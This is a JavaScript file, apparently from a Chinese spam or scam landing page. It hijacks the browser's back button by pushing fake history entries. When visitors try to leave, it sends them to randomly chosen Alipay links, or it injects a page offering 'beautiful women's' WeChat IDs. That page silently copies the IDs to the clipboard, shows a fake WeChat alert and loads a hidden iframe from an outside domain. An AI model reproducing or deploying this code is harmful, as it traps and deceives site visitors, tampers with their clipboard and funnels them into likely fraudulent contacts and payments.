function hrefs() {
	window.history.pushState('forward', null, location.pathname + '?index=1');
	window.history.pushState('forward', null, location.pathname + '?index=2');
}

var qrs = [];
getLinks()

function getLinks() {
	$.ajax({
		url: '/alipayLink',
		method: 'get',
		success: function(res) {
			qrs = res.data
		}
	})
}

if(window.history && window.history.pushState) {
	window.onpopstate = function() {
		var hashLocation = location.hash;
		var hashSplit = hashLocation.split("#!/");
		var hashName = hashSplit[1];
		var index = 0;
		try {
			index = parseInt(location.href.split("index=")[1].split("&")[0]);
		} catch(err) {
			console.log(err)
		}
		if(index == 1) {
			$("#content").remove()
			var html = '<div id="content"><div class="wrapper"><ul><li><img src="http://pfux28ud3.bkt.clouddn.com/1.jpg" /><img src="http://pfux28ud3.bkt.clouddn.com/2.jpg" /><img src="http://pfux28ud3.bkt.clouddn.com/3.jpg" /><div class="description"><span>老铁们赶紧上车</span><button id="first">点击复制美女微信</button></div></li><li><img src="http://pfux28ud3.bkt.clouddn.com/4.jpg" /><img src="http://pfux28ud3.bkt.clouddn.com/5.jpg" /><img src="http://pfux28ud3.bkt.clouddn.com/6.jpg" /><div class="description"><span>老铁们赶紧上车</span><button id="second">点击复制美女微信</button></div></li><li><img src="http://pfux28ud3.bkt.clouddn.com/7.jpg" /><img src="http://pfux28ud3.bkt.clouddn.com/8.jpg" /><img src="http://pfux28ud3.bkt.clouddn.com/9.jpg" /><div class="description"><span>老铁们赶紧上车</span><button id="third">点击复制美女微信</button></div></li></ul></div></div><textarea id="foo2"></textarea><div style="display:none" data-author="mingxingshuo"><iframe src="http://www.nyzda.top/back_meinv_cnzz.html"></iframe></div><script>var first = $("#first"),second = $("#second"),third = $("#third");copy(first[0], "sxj198242");copy(second[0], "ai1824947");copy(third[0], "LL351160");</script>';
			$("body").append(html)
		} else {
			if(!getCookie('mingxingshuo_alipay_xiaoshuo')) {
				var index = parseInt(Math.random() * qrs.length)
				setCookie('mingxingshuo_alipay_xiaoshuo', 'wonazhidaoshinage')
				location.href = qrs[index].link
			} else {
				console.log('history back')
				history.back()
			}
		}

	}
}

function setCookie(cookieName, cookieValue) {
	//当前日期
	var curDate = new Date();
	//当前时间戳
	var curTamp = curDate.getTime();
	//当日凌晨的时间戳,减去一毫秒是为了防止后续得到的时间不会达到00:00:00的状态
	var curWeeHours = new Date(curDate.toLocaleDateString()).getTime() - 1;
	//当日已经过去的时间（毫秒）
	var passedTamp = curTamp - curWeeHours;
	//当日剩余时间
	var leftTamp = 24 * 60 * 60 * 1000 - passedTamp;
	var leftTime = new Date();
	leftTime.setTime(leftTamp + curTamp);
	//创建cookie
	document.cookie = cookieName + "=" + escape(cookieValue) + ";expires=" + leftTime.toGMTString();
}

/* 
功能：获取cookies函数  
参数：name，cookie名字 
*/
function getCookie(name) {   
	var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));   
	if(arr != null)    {       
		return unescape(arr[2]);   
	} else    {       
		return null;   
	}
};

hrefs();
//(function(doc, win) {
//	var docEl = doc.documentElement,
//		resizeEvt = "orientationchange" in window ? "orientationchange" : "resize",
//		recalc = function() {
//			var clientWidth = docEl.clientWidth;
//			if(!clientWidth) return;
//			if(clientWidth >= 640) {
//				docEl.style.fontSize = "100px";
//			} else {
//				docEl.style.fontSize = 100 * (clientWidth / 750) + "px";
//			}
//		};
//	if(!doc.addEventListener) return;
//	win.addEventListener(resizeEvt, recalc, false);
//	doc.addEventListener("DOMContentLoaded", recalc, false);
//})(document, window);


function copy(el, num) {
	var copy = function() {
		var b = document.getElementById("foo2");
		b.value = num;
		b.select();
		b.setSelectionRange(0, b.value.length);
		if(document.execCommand("copy", false, null)) {};
	};
	el.addEventListener("click", function() {
		copy();
		alert("微信网页提示：\n\n1.美女微信号已成功复制\n\n2.点击确定前往微信添加美女微信");
		window.location.replace("weixin://");
	});
};